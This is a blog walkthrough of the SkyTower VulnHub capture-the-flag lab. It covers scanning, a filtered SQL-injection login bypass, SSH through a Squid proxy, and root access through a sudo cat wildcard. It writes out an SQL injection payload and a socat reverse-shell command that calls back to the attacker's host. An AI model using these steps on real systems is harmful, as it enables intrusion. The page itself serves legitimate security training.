<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>VulnHub - SkyTower</title>
  <meta name="description" content="Walkthrough - SkyTower">

  <!-- Social: Twitter -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:site" content="@">
  <meta name="twitter:title" content="VulnHub - SkyTower">
  <meta name="twitter:description" content="Walkthrough - SkyTower">
  
  <meta property="twitter:image:src" content="http://localhost:4000/assets/img/opengraph.png">
  

  <!-- Social: Facebook / Open Graph -->
  <meta property="og:url" content="http://localhost:4000/dropdown/VulnHub-SkyTower.html">
  <meta property="og:title" content="VulnHub - SkyTower">
  
  <meta property="og:image" content="http://localhost:4000/assets/img/opengraph.png">
  
  <meta property="og:description" content="Walkthrough - SkyTower">
  <meta property="og:site_name" content="Nes-Security-Blog">

  <!-- Social: Schema.org  -->
  <meta itemprop="name" content="VulnHub - SkyTower"/>
  <meta itemprop="description" content="Walkthrough - SkyTower">
  <meta itemprop="image" content="http://localhost:4000/assets/img/opengraph.png"/>

  <!-- Favicon -->
  <link rel="shortcut icon" href="/assets/img/icons/favicon.ico" type="image/x-icon" />

  <!-- Android Lolipop Theme Color -->
  <meta name="theme-color" content="#2a4d14">

  <!-- Styles -->
  <link rel="stylesheet" id="css-theme" href="/assets/css/main-dark.css">
  <link rel="stylesheet" href="/assets/css/highlight/gruvbox.css">
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
  <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet">

  <!-- Javascript -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/d3/4.3.0/d3.min.js"></script>
  <script type="text/javascript" src="/assets/js/main.js"></script>
</head>


<body class="animated fadeIn">
  <div class="container">
    <div id="background-div">
      <svg id="background-svg">
        <lineargradient id="Gradient1" x1="0" x2="0" y1="0" y2="1">
          <stop stop-opacity="0" class="bgColor2" offset="0%" />
          <stop stop-opacity="0.5" class="bgColor2" offset="10%" />
          <stop stop-opacity="0.5" class="bgColor1" offset="40%" />
          <stop stop-opacity="0" class="bgColor1" offset="100%" />
        </lineargradient>
        <g id="bg-layer1"></g>
        <g id="bg-layer2" class="hide"></g>
        <g id="bg-layer3"></g>
        <g id="bg-layer4"></g>
      </svg>
    </div>
    <section class="header">
      <header>
  <div class="row">
    <div class="col-xs-12">
      <nav class="navbar navbar-default navbar-fixed-top">
        <div class="container">
          <div class="navbar-header">
            <a class="navbar-toggle collapsed navbar-icon" data-toggle="collapse"
              data-target="#bs-example-navbar-collapse-1">
              <i class="fa fa-bars fa-2x"></i>
            </a>
            <a class="navbar-brand navbar-icon" href="/">
                <i class="fa fa-home fa-2x"></i>
            </a>
          </div>

          <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav navbar-right">
              <li><a href="/">Home</a></li>
              

              
                <li class="dropdown dropdown-Cheatsheets">
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
                    role="button" aria-haspopup="true" aria-expanded="false">Cheatsheets
                    <span class="caret"></span>
                  </a>
                  <ul class="dropdown-menu dropdown-menu-Linux privilege escalation cheatsheet">
                    <li priority="1"><a href="/dropdown/Linux-privilege-escalation-cheatsheet.html">Linux privilege escalation cheatsheet</a></li>
                  </ul>
                </li>
              
                <li class="dropdown dropdown-Walkthroughs">
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
                    role="button" aria-haspopup="true" aria-expanded="false">Walkthroughs
                    <span class="caret"></span>
                  </a>
                  <ul class="dropdown-menu dropdown-menu-VulnHub - Mr. Robot">
                    <li priority="1"><a href="/dropdown/VulnHub-Mr.Robot.html">VulnHub - Mr. Robot</a></li>
                  </ul>
                </li>
              
                <li class="dropdown dropdown-Walkthroughs">
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
                    role="button" aria-haspopup="true" aria-expanded="false">Walkthroughs
                    <span class="caret"></span>
                  </a>
                  <ul class="dropdown-menu dropdown-menu-VulnHub - NullByte">
                    <li priority="1"><a href="/dropdown/VulnHub-NullByte.html">VulnHub - NullByte</a></li>
                  </ul>
                </li>
              
                <li class="dropdown dropdown-Walkthroughs">
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
                    role="button" aria-haspopup="true" aria-expanded="false">Walkthroughs
                    <span class="caret"></span>
                  </a>
                  <ul class="dropdown-menu dropdown-menu-VulnHub - Photographer">
                    <li priority="1"><a href="/dropdown/VulnHub-Photographer.html">VulnHub - Photographer</a></li>
                  </ul>
                </li>
              
                <li class="dropdown dropdown-Walkthroughs">
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
                    role="button" aria-haspopup="true" aria-expanded="false">Walkthroughs
                    <span class="caret"></span>
                  </a>
                  <ul class="dropdown-menu dropdown-menu-VulnHub - SickOS1.1">
                    <li priority="1"><a href="/dropdown/VulnHub-SickOS1.1.html">VulnHub - SickOS1.1</a></li>
                  </ul>
                </li>
              
                <li class="dropdown dropdown-Walkthroughs">
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
                    role="button" aria-haspopup="true" aria-expanded="false">Walkthroughs
                    <span class="caret"></span>
                  </a>
                  <ul class="dropdown-menu dropdown-menu-VulnHub - SickOS1.2">
                    <li priority="1"><a href="/dropdown/VulnHub-SickOS1.2.html">VulnHub - SickOS1.2</a></li>
                  </ul>
                </li>
              
                <li class="dropdown dropdown-Walkthroughs">
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
                    role="button" aria-haspopup="true" aria-expanded="false">Walkthroughs
                    <span class="caret"></span>
                  </a>
                  <ul class="dropdown-menu dropdown-menu-VulnHub - SkyTower">
                    <li priority="1"><a href="/dropdown/VulnHub-SkyTower.html">VulnHub - SkyTower</a></li>
                  </ul>
                </li>
              
                <li class="dropdown dropdown-Cheatsheets">
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
                    role="button" aria-haspopup="true" aria-expanded="false">Cheatsheets
                    <span class="caret"></span>
                  </a>
                  <ul class="dropdown-menu dropdown-menu-Windows privilege escalation cheatsheet">
                    <li priority="1"><a href="/dropdown/Windows-privilege-escalation-cheatsheet.html">Windows privilege escalation cheatsheet</a></li>
                  </ul>
                </li>
              
              

              <script>
                // clean repeated dropdowns and add <li> to their positions
                let done = [];
                let elements = [];
                $(".dropdown")
                  //
                  .each((index0 , value0) => {
                    let dropdownClass = "."+$(value0)[0].classList[1];
                    if (done.indexOf(dropdownClass) !== -1) return
                    done.push(dropdownClass)
                    let dropdownMain = $(dropdownClass)[0]
                    let itemsList = $(dropdownClass+">ul>li").sort((a, b) => parseInt(b.getAttribute("priority") || -9999999) - parseInt(a.getAttribute("priority") || -9999999))
                    $(dropdownClass+">ul>li").remove();
                    $(dropdownClass+">ul").append(itemsList)
                    $(dropdownClass).remove();
                    elements.push(dropdownMain)
                });
                let priority = [ "About",  "dropdown", ];
                elements = elements.concat(...$(".nav-item").remove())
                priority.map(text => {
                  elements = elements.filter(node => {
                      let nodeText = node.querySelector("a").textContent.trim()
                      if (text == nodeText) {
                          $(".nav").append(node)
                          return false;
                      }
                      return true;
                  })
                });
                $(".nav").append(elements)
              </script>
            </ul>
          </div>
        </div>
      </nav>
    </div>
  </div>
</header>

    </section>
    <section class="content">
      <div class="row">
        <!-- <div class="col-sm-2">
          <div class="pane-separator hidden-xs" style="margin-bottom:30em;"></div>
          <div class="left-pane">
          </div>
        </div> -->
        <div class="col-sm-8 col-sm-offset-2 content-div">
          <div class="page-separator hidden-xs">
            <h1 class="h1-strip" style="padding-bottom:8em; margin-bottom: 0;"></h1>
          </div>
          <div class="page-separator visible-xs">
            <h1 class="h1-strip" style="padding-bottom:2em; margin-bottom: 0;"></h1>
          </div>
          <h1 class="post-title page-title" id="title"><a href="#title">VulnHub - SkyTower</a></h1>
          <h2 id="vm-description">VM Description</h2>

<p>This CTF was designed by Telspace Systems for the CTF at the ITWeb Security Summit and BSidesCPT (Cape Town). The aim is to test intermediate to advanced security enthusiasts in their ability to attack a system using a multi-faceted approach and obtain the “flag”.</p>

<p>This VM isn’t too difficult and is a good training material for the OSCP certification.</p>

<p>Download: <a href="https://www.vulnhub.com/entry/skytower-1,96/">SkyTower</a></p>

<p>Author: <a href="https://www.vulnhub.com/author/telspace,90/">Telespace</a></p>

<h2 id="enumeration">Enumeration</h2>

<p>We configure the VM in bridge mode. In order to determine its assigned IP, we run the below command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$arp</span><span class="nt">-scan</span> <span class="nt">-I</span> wlan0 <span class="nt">-l</span> 
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$nmap</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> <span class="nt">-oA</span> nmap/nmap 192.168.1.31
</code></pre></div></div>

<div class="row">
  <div class="col-md-6">
    <table class="table table-bordered">
      <thead>
        <tr>
          <th>Open port</th>
          <th>Service</th>
          <th>Version</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>80</td>
          <td> Apache </td>
          <td>2.2.22</td>
        
        </tr>
        <tr>
         <td> 3128 </td>
          <td> squid </td>
          <td> 3.1.20 </td>
        </tr>
       </tbody>
    </table>
  </div>
</div>

<h4 id="web-server-directory-enumeration">Web Server Directory Enumeration</h4>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$gobuster</span> <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.1.31 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> .php,.txt <span class="nt">-o</span> gobuster-80.txt
</code></pre></div></div>

<p>Gobuster finds login.php page. Let’s see what is there.</p>

<p><img src="../assets/img/Walkthroughs/skytower/1.png" alt="login page" /></p>

<p>It’s always a good idea to check a web page source code.</p>

<p><img src="../assets/img/Walkthroughs/skytower/2.png" alt="login page src code" /></p>

<p>In this case, it looks like it’s a basic login page; probably coded by a junior developer. This is good news for us because it is likely vulnerable to an SQL injection. Let’s check!</p>

<p>We attempt to login using admin’ or 1=1;– as username and admin as password. Based on the response, the web server is vulnerable to an SQL injection but there is some kind of filtering that we will need to bypass.</p>

<p><img src="../assets/img/Walkthroughs/skytower/3.png" alt="sql injection" /></p>

<p><img src="../assets/img/Walkthroughs/skytower/4.png" alt="filter bypass" /></p>

<h2 id="exploit">Exploit</h2>

<p>Every time we need to bypass some kind of filtering, we need to check which characters are allowed and which are not. Burp Repeater can come in handy in this case as it allows us to easily send a modified payload without going through the web interface each time.</p>

<p>We can determine that the following parameters are filtered as they are removed from the response:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select, or, =,--
</code></pre></div></div>

<p>There are a lot of guides on how to bypass these filters including this <a href="https://www.exploit-db.com/papers/17934">article</a> in exploit-db.</p>

<p><img src="../assets/img/Walkthroughs/skytower/5.png" alt="working payload" /></p>

<p>Excellent. We can now read the message addressed to user John.</p>

<p><img src="../assets/img/Walkthroughs/skytower/6.png" alt="Successful login" /></p>

<p>Since port 22 is filtered based on our Nmap scans, we need to proxy the connection through the SQUID server. This can be easily achieved by adding this line at the end of /etc/proxychains.conf.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http	192.168.1.31 3128
</code></pre></div></div>

<p><img src="../assets/img/Walkthroughs/skytower/7.png" alt="ssh as john" /></p>

<p>The connection is automatically closed but let’s see if we can still execute commands.</p>

<p><img src="../assets/img/Walkthroughs/skytower/8.png" alt="bypassing shell restriction" /></p>

<p>Another way to go is to upload a reverse shell to the tmp directory and execute it.</p>

<p>We first need to generate a payload with Msfvenom:
<img src="../assets/img/Walkthroughs/skytower/9.png" alt="generating payload" /></p>

<p>We can now upload the file using scp:
<img src="../assets/img/Walkthroughs/skytower/10.png" alt="Upload the file" /></p>

<p>We set-up a Netcat listener and execute the file after changing its permissions:
<img src="../assets/img/Walkthroughs/skytower/11.png" alt="Running exploit" /></p>

<p><img src="../assets/img/Walkthroughs/skytower/12.png" alt="Connected as john" /></p>

<p>Great. The first we need to do once we have a simple reverse shell is to upgrade to a fully interactive TTY.</p>

<p>This <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">article</a> by ropnop details different methods to do that. Since python is not installed on the target, we can use socat to upgrade our shell.</p>

<p>We setup a listener on Kali:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$socat</span> file:<span class="sb">`</span><span class="nb">tty</span><span class="sb">`</span>,raw,echo<span class="o">=</span>0 tcp-listen:4444
</code></pre></div></div>
<p>And then execute the below command on the target machine:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$socat</span> <span class="nb">exec</span>:<span class="s1">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:192.168.1.34:4444
</code></pre></div></div>

<p><img src="../assets/img/Walkthroughs/skytower/13.png" alt="TTY upgrade" /></p>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<h4 id="escalating-to-user-sara">Escalating to user Sara</h4>

<p>We run the automated <a href="https://github.com/rebootuser/LinEnum">LinEnum.sh</a> script to find attack vectors that can allow us to escalate to root.</p>

<p>The script found Mysql credentials (root:root). Awesome. Let’s connect to mysql and see what information we have.</p>

<p><img src="../assets/img/Walkthroughs/skytower/14.png" alt="mysql credentials" /></p>

<p>To connect to the database, we run:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$mysql</span> <span class="nt">-u</span> root <span class="nt">-p</span>
</code></pre></div></div>

<p><img src="../assets/img/Walkthroughs/skytower/15.png" alt="users passwords" /></p>

<p>We attempt to SSH as William but the password is incorrect. However, Sara’s password is valid and we can SSH as Sara as we did with John.</p>

<h4 id="escalating-to-user-root">Escalating to user root</h4>

<p>One of the first things to check, even before running the automatic script, is to determine if the user we are connected as is in the sudo group by executing [sudo -l].</p>

<p><img src="../assets/img/Walkthroughs/skytower/16.png" alt="sudo" /></p>

<p>User Sara can run /bin/cat /accounts/* and /bin/ls /accounts/* as root without supplying a password.</p>

<p>Since accounts is appended with *, we can perform directory traversal and read any file on the system.</p>

<p><img src="../assets/img/Walkthroughs/skytower/18.png" alt="flag" /></p>

<p>We have the root user password. Let’s connect as root. Mission complete :)</p>

<p><img src="../assets/img/Walkthroughs/skytower/19.png" alt="root" /></p>



        </div>
        <div class="col-sm-2">
          <div class="pane-separator hidden-xs" style="margin-bottom:30em;"></div>
          <div class="pane-separator visible-xs" style="margin-bottom:5em;"></div>
          <div class="right-pane" style="margin-left: 1em;">
            
              <div class="avatar">
                <center>
                  
                    <img src="/assets/img/avatar.jpg" alt="me" class="avatar-image">
                  
                  
                    <p class="avatar-description"></p>
                  
                  <div class="right-links">
                    
<a href="https://github.com/neskortas" target="_blank">
  <i class="fa fa-github fa-3x"></i>
</a>


<a href="mailto:nesrinekortasblog@gmail.com">
  <i class="fa fa-envelope fa-3x"></i>
</a>




<a href="https://www.linkedin.com/in/nesrine-kortas" target="_blank">
  <i class="fa fa-linkedin fa-3x"></i>
</a>


                  </div>
                </center>
              </div>
            
            
          </div>
        </div>
      </div>
    </section>
    <section class="footer">
      <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta http-equiv="Content-Style-Type" content="text/css">
  <title></title>
  <meta name="Generator" content="Cocoa HTML Writer">
  <meta name="CocoaVersion" content="1894.4">
  <style type="text/css">
    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; text-align: center; font: 12.0px Times; color: #000000; -webkit-text-stroke: #000000}
    span.s1 {font-kerning: none}
  </style>
</head>
<body>
<p class="p1"><span class="s1"></span></p>
<p class="p1"><span class="s1">
<a href="https://github.com/neskortas" target="_blank">
  <i class="fa fa-github fa-3x"></i>
</a>


<a href="mailto:nesrinekortasblog@gmail.com">
  <i class="fa fa-envelope fa-3x"></i>
</a>




<a href="https://www.linkedin.com/in/nesrine-kortas" target="_blank">
  <i class="fa fa-linkedin fa-3x"></i>
</a>

<span class="Apple-converted-space"> </span></span></p>
<p class="p1"><span class="s1"></span></p>
<p class="p1"><span class="s1">Copyright (c) 2020 Nesrine kortas<span class="Apple-converted-space"> </span></span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space"> </span></span></p>
</body>
</html>

    </section>
  </div>
</body>

</html>
